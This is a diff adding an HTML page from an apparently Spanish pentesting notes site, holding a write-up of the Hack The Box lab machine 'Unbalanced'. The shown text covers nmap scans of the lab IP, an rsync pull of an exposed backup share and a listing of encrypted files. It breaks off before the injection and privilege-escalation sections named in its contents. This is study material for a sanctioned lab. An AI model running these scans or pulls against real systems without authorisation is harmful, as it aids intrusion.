@@ -1,0 +1,1383 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Unbalanced - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#unbalanced-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Unbalanced
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../epsilon/" class="md-nav__link">
+        Epsilon
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flustered/" class="md-nav__link">
+        Flustered
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pressed/" class="md-nav__link">
+        Pressed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Unbalanced
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Unbalanced
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-key" class="md-nav__link">
+    Cracking KEY
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#descifrar-data-con-encfs" class="md-nav__link">
+    Descifrar data con encFS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli-en-nodo-en-mantenimiento" class="md-nav__link">
+    SQLi en nodo en mantenimiento
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xpath-injection-link-del-paper" class="md-nav__link">
+    XPATH injection - Link del paper
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotation-intrusion" class="md-nav__link">
+    Explotation - Intrusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalado-de-privilegios" class="md-nav__link">
+    Escalado de Privilegios
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/return/" class="md-nav__link">
+        Return
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="unbalanced-htb">Unbalanced HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>ping 10.10.10.200</code></p>
+</blockquote>
+<p><img alt="Conectividad OK" src="../images/unbalanced_ping.png" title="Leyenda de la imagen" /></p>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.200</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un analisis de los puertos abiertos:</p>
+<blockquote>
+<p><code>nmap -sVC -p22,873,3128 10.10.10.200 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 01:58 CEST
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Nmap scan report for 10.10.10.200
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Host is up (0.043s latency).
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PORT     STATE SERVICE    VERSION
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>| ssh-hostkey: 
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>873/tcp  open  rsync      (protocol version 31)
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>3128/tcp open  http-proxy Squid http proxy 4.6
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>|_http-title: ERROR: The requested URL could not be retrieved
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>|_http-server-header: squid/4.6
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
+</code></pre></div>
+</li>
+<li>
+<p>Al encontrar un servicio rsync, se revisa y se encuentra data cifrada:</p>
+<blockquote>
+<p><code>rsync -a 'rsync://10.10.10.200/conf_backups' mycopy --port 873</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ls -la mycopy  
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>drwxr-xr-x root root 4.1 KB Sat Apr  4 17:05:32 2020  .
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>drwxr-xr-x root root  60 B  Mon Aug  1 02:25:09 2022  ..
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>.rw-r--r-- root root 288 B  Sat Apr  4 17:05:31 2020  ,CBjPJW4EGlcqwZW4nmVqBA6
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>.rw-r--r-- root root 135 B  Sat Apr  4 17:05:31 2020  -FjZ6-6,Fa,tMvlDsuVAO7ek
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>.rw-r--r-- root root 1.3 KB Thu Apr  2 15:06:19 2020  .encfs6.xml
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>.rw-r--r-- root root 154 B  Sat Apr  4 17:05:32 2020  0K72OfkNRRx3-f0Y6eQKwnjn
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>.rw-r--r-- root root  56 B  Sat Apr  4 17:05:32 2020  27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>.rw-r--r-- root root 190 B  Sat Apr  4 17:05:32 2020  2VyeljxHWrDX37La6FhUGIJS
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>.rw-r--r-- root root 537 B  Sat Apr  4 17:05:31 2020  3cdBkrRF7R5bYe1ZJ0KYy786
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>.rw-r--r-- root root 386 B  Sat Apr  4 17:05:31 2020  3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>.rw-r--r-- root root 560 B  Sat Apr  4 17:05:31 2020  3xB4vSQH-HKVcOMQIs02Qb9,
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>.rw-r--r-- root root 275 B  Sat Apr  4 17:05:32 2020  4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>.rw-r--r-- root root 463 B  Sat Apr  4 17:05:32 2020  5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>.rw-r--r-- root root 2.1 KB Sat Apr  4 17:05:31 2020  5FTRnQDoLdRfOEPkrhM2L29P
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>.rw-r--r-- root root 238 B  Sat Apr  4 17:05:31 2020  5IUA28wOw0wwBs8rP5xjkFSs
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>.rw-r--r-- root root 1.2 KB Sat Apr  4 17:05:31 2020  6R1rXixtFRQ5c9ScY8MBQ1Rg
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>.rw-r--r-- root root 108 B  Sat Apr  4 17:05:31 2020  7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>.rw-r--r-- root root 1.3 KB Sat Apr  4 17:05:32 2020  7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>.rw-r--r-- root root 1.0 KB Sat Apr  4 17:05:31 2020  8CBL-MBKTDMgB6AT2nfWfq-e
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>.rw-r--r-- root root  29 B  Sat Apr  4 17:05:31 2020  8e6TAzw0xs2LVxgohuXHhWjM
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>.rw-r--r-- root root 152 B  Sat Apr  4 17:05:31 2020  8XDA,IOhFFlhh120yl54Q0da
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>.rw-r--r-- root root 5.6 KB Sat Apr  4 17:05:31 2020  9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>.rw-r--r-- root root 2.9 KB Sat Apr  4 17:05:31 2020  A4qOD1nvqe9JgKnslwk1sUzO
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>.rw-r--r-- root root 1.1 KB Sat Apr  4 17:05:31 2020  a4zdmLrBYDC24s9Z59y-Pwa2
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>.rw-r--r-- root root 443 B  Sat Apr  4 17:05:31 2020  Acv0PEQX8vs-KdK307QNHaiF
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>.rw-r--r-- root root 935 B  Sat Apr  4 17:05:31 2020  B6J5M3OP0X7W25ITnaZX753T
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>.rw-r--r-- root root 3.6 KB Sat Apr  4 17:05:31 2020  c9w3APbCYWfWLsq7NFOdjQpA
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>.rw-r--r-- root root 1.5 KB Sat Apr  4 17:05:32 2020  Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>.rw-r--r-- root root 332 B  Sat Apr  4 17:05:31 2020  cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>.rw-r--r-- root root 2.5 KB Sat Apr  4 17:05:31 2020  dF2GU58wFl3x5R7aDE6QEnDj
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>.rw-r--r-- root root 1.2 KB Sat Apr  4 17:05:31 2020  dNTEvgsjgG6lKBr8ev8Dw,p7
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>.rw-r--r-- root root 2.3 KB Sat Apr  4 17:05:31 2020  ECXONXBBRwhb5tYOIcjjFZzh
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>.rw-r--r-- root root 1.4 KB Sat Apr  4 17:05:32 2020  F4F9opY2nhVVnRgiQ,OUs-Y0
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>.rw-r--r-- root root 354 B  Sat Apr  4 17:05:32 2020  FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>.rw-r--r-- root root 3.2 KB Sat Apr  4 17:05:31 2020  FSXWRSwW6vOvJ0ExPK0fXJ6F
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>.rw-r--r-- root root 422 B  Sat Apr  4 17:05:31 2020  gK5Z2BBMSh9iFyCFfIthbkQ6
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>.rw-r--r-- root root 2.3 KB Sat Apr  4 17:05:31 2020  gRhKiGIEm4SvYkTCLlOQPeh-
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>.rw-r--r-- root root 1.9 KB Sat Apr  4 17:05:32 2020  hqZXaSCJi-Jso02DJlwCtYoz
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>.rw-r--r-- root root 1.8 KB Sat Apr  4 17:05:32 2020  iaDKfUAHJmdqTDVZsmCIS,Bn
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>.rw-r--r-- root root  95 B  Sat Apr  4 17:05:31 2020  IymL3QugM,XxLuKEdwJJOOpi
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>.rw-r--r-- root root 4.5 KB Sat Apr  4 17:05:31 2020  jIY9q65HMBxJqUW48LJIc,Fj
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>.rw-r--r-- root root 158 B  Sat Apr  4 17:05:32 2020  Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>.rw-r--r-- root root 4.9 KB Sat Apr  4 17:05:31 2020  kdJ5whfqyrkk6avAhlX-x0kh
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>.rw-r--r-- root root 657 B  Sat Apr  4 17:05:31 2020  kheep9TIpbbdwNSfmNU1QNk-
